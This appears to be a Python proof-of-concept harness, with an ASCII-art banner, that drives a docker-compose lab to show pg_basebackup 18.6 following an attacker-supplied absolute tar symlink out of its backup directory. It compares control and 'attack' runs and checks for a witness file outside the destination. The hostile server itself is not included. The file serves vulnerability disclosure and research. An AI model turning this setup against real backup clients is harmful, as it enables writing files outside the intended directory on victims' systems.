#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#  Mail    : abraxas.null@proton.me
#
#  CVE: postgres-basebackup-symlink (High: 8.8)
#  Vendor: PostgreSQL (PostgreSQL Global Development Group)
#  Versions: PostgreSQL 18.6 pg_basebackup / pg_rewind
#  Impact: pg_basebackup follows absolute tar symlink leftover of CVE-2026-6475
#  Requires: hostile BASE_BACKUP source; victim runs default pg_basebackup -D; loopback lab
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "postgres-basebackup-symlink"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_EMAIL = "abraxas.null@proton.me"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL), ("Mail", _EMAIL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

"""Prove pg_basebackup 18.6 follows attacker absolute tar symlink targets."""


import os
import subprocess
from pathlib import Path

WITNESS = "POSTGRES-BASEBACKUP-SYMLINK-WITNESS"
LABEL = "postgres-basebackup-symlink"
COMPOSE_PROJECT = os.environ.get("COMPOSE_PROJECT_NAME", LABEL)
HERE = Path(__file__).resolve().parent
WORK = HERE / "work"
DEST = WORK / "dest"
ORACLE = WORK / "oracle"
ORACLE_FILE = ORACLE / WITNESS
IMAGE_TAG = "postgres:18.6"
BACKUP_TIMEOUT = 40
CLIENT_DEST = "/work/dest"
CLIENT_ORACLE = "/work/oracle"


def log(msg: str) -> None:
    print(msg, flush=True)


def fail(reason: str) -> int:
    log(f"FAIL {LABEL} {reason} {WITNESS}")
    return 1


def compose(*args: str, timeout: int = 60) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["docker", "compose", "-p", COMPOSE_PROJECT, *args],
        cwd=HERE,
        text=True,
        capture_output=True,
        timeout=timeout,
    )


def client_exec(args: list[str], timeout: int = BACKUP_TIMEOUT) -> subprocess.CompletedProcess[str]:
    return compose("exec", "-T", "client", *args, timeout=timeout)


def wipe_tree(root: Path) -> None:
    if not root.exists():
        return
    for path in sorted(root.rglob("*"), reverse=True):
        if path.is_symlink() or path.is_file():
            path.unlink()
        elif path.is_dir():
            path.rmdir()


def ensure_dirs() -> None:
    wipe_tree(DEST)
    wipe_tree(ORACLE)
    DEST.mkdir(parents=True, exist_ok=True)
    ORACLE.mkdir(parents=True, exist_ok=True)


def list_rel(root: Path) -> list[str]:
    if not root.exists():
        return []
    out: list[str] = []
    for path in sorted(root.rglob("*")):
        rel = str(path.relative_to(WORK))
        if path.is_symlink():
            out.append(f"{rel}->{path.readlink()}")
        elif path.is_file():
            out.append(rel)
        elif path.is_dir():
            out.append(f"{rel}/")
    return out


def read_text(path: Path) -> str:
    try:
        return path.read_text(encoding="utf-8", errors="replace")
    except OSError as exc:
        log(f"ioc read-fail path={path} err={exc}")
        return ""


def client_ls(path: str) -> str:
    proc = client_exec(["ls", "-la", path], timeout=20)
    blob = ((proc.stdout or "") + (proc.stderr or "")).strip()
    log(f"ioc container-ls path={path} rc={proc.returncode} text={blob!r}")
    return blob


def backup_version() -> str:
    proc = client_exec(["pg_basebackup", "--version"], timeout=20)
    text = ((proc.stdout or "") + (proc.stderr or "")).strip()
    log(f"pg_basebackup-version rc={proc.returncode} text={text!r}")
    if proc.returncode != 0 or "18.6" not in text:
        raise SystemExit(fail(f"client-version-mismatch image={IMAGE_TAG} text={text!r}"))
    return text.splitlines()[-1] if text else "pg_basebackup 18.6"


def run_backup(label: str) -> tuple[int | None, str, str]:
    cmd = [
        "pg_basebackup",
        "-h",
        "source",
        "-p",
        "5432",
        "-U",
        "postgres",
        "-D",
        CLIENT_DEST,
        "-F",
        "p",
        "-X",
        "none",
        "--no-slot",
        "--no-manifest",
        "--no-sync",
        "-w",
        "-v",
        "-l",
        label,
    ]
    log(f"run-{label} cmd={' '.join(cmd)}")
    try:
        proc = client_exec(cmd, timeout=BACKUP_TIMEOUT)
        return proc.returncode, proc.stdout or "", proc.stderr or ""
    except subprocess.TimeoutExpired as exc:
        out = exc.stdout if isinstance(exc.stdout, str) else ""
        err = exc.stderr if isinstance(exc.stderr, str) else ""
        return None, out, err + "\nTIMEOUT"


def source_logs() -> str:
    proc = compose("logs", "--no-color", "source", timeout=30)
    return ((proc.stdout or "") + (proc.stderr or "")).strip()


def main() -> int:
    ensure_dirs()
    version = backup_version()
    log(f"ioc image={IMAGE_TAG} client={version}")
    log(f"ioc pre-control files={list_rel(WORK)}")

    c_rc, c_out, c_err = run_backup("control")
    log(f"ioc control-rc={c_rc!s}")
    log(f"ioc control-stderr={c_err[-1800:]!r}")
    log(f"ioc control-stdout={c_out[-800:]!r}")
    log(f"ioc control-files={list_rel(WORK)}")
    client_ls(CLIENT_DEST)
    client_ls(CLIENT_ORACLE)

    control_pg_version = DEST / "PG_VERSION"
    control_inside = control_pg_version.is_file() and "18" in read_text(control_pg_version)
    control_oracle_absent = not ORACLE_FILE.exists()
    control_symlink = DEST / "pg_tblspc" / "16384"
    control_no_escape = not control_symlink.exists() and not control_symlink.is_symlink()
    log(
        f"ioc control-inside={control_inside} control-oracle-absent={control_oracle_absent} "
        f"control-no-escape={control_no_escape}"
    )
    if not (c_rc == 0 and control_inside and control_oracle_absent and control_no_escape):
        log("ioc source-logs-tail <<<")
        log("\n".join(source_logs().splitlines()[-80:]))
        log("ioc source-logs-tail >>>")
        return fail(
            f"control-failed rc={c_rc!s} inside={control_inside} "
            f"oracle-absent={control_oracle_absent} no-escape={control_no_escape}"
        )

    wipe_tree(DEST)
    wipe_tree(ORACLE)
    DEST.mkdir(parents=True, exist_ok=True)
    ORACLE.mkdir(parents=True, exist_ok=True)

    a_rc, a_out, a_err = run_backup("attack")
    log(f"ioc attack-rc={a_rc!s}")
    log(f"ioc attack-stderr={a_err[-1800:]!r}")
    log(f"ioc attack-stdout={a_out[-800:]!r}")
    log(f"ioc attack-files={list_rel(WORK)}")
    client_ls(CLIENT_DEST)
    client_ls(f"{CLIENT_DEST}/pg_tblspc")
    client_ls(CLIENT_ORACLE)

    dest_pg_version = DEST / "PG_VERSION"
    dest_inside = dest_pg_version.is_file() and "18" in read_text(dest_pg_version)
    link_path = DEST / "pg_tblspc" / "16384"
    dest_is_symlink = link_path.is_symlink()
    link_target = str(link_path.readlink()) if dest_is_symlink else ""
    oracle_text = read_text(ORACLE_FILE) if ORACLE_FILE.is_file() else ""
    oracle_outside = ORACLE_FILE.is_file() and WITNESS in oracle_text
    dest_root_witness = (DEST / WITNESS).is_file() and not (DEST / WITNESS).is_symlink()
    log(
        f"ioc dest-inside={dest_inside} dest-is-symlink={dest_is_symlink} "
        f"link-target={link_target!r} oracle-outside={oracle_outside} "
        f"dest-root-witness={dest_root_witness}"
    )
    if oracle_outside:
        log(f"ioc oracle-head={oracle_text[:200]!r}")

    logs = source_logs()
    log("ioc source-logs-tail <<<")
    log("\n".join(logs.splitlines()[-120:]))
    log("ioc source-logs-tail >>>")
    saw_attack = "attack=true" in logs
    log(f"ioc saw-attack-query={saw_attack}")

    ok = (
        a_rc == 0
        and dest_inside
        and dest_is_symlink
        and link_target == CLIENT_ORACLE
        and oracle_outside
        and not dest_root_witness
        and "18.6" in version
    )
    status = "SUCCESS" if ok else "FAIL"
    log(
        f"{status} {LABEL} control-inside=yes oracle-outside="
        f"{'yes' if oracle_outside else 'no'} dest-is-symlink="
        f"{'yes' if dest_is_symlink else 'no'} image={IMAGE_TAG} "
        f"how=pg_basebackup {WITNESS}"
    )
    return 0 if ok else 1


if __name__ == "__main__":
    raise SystemExit(main())

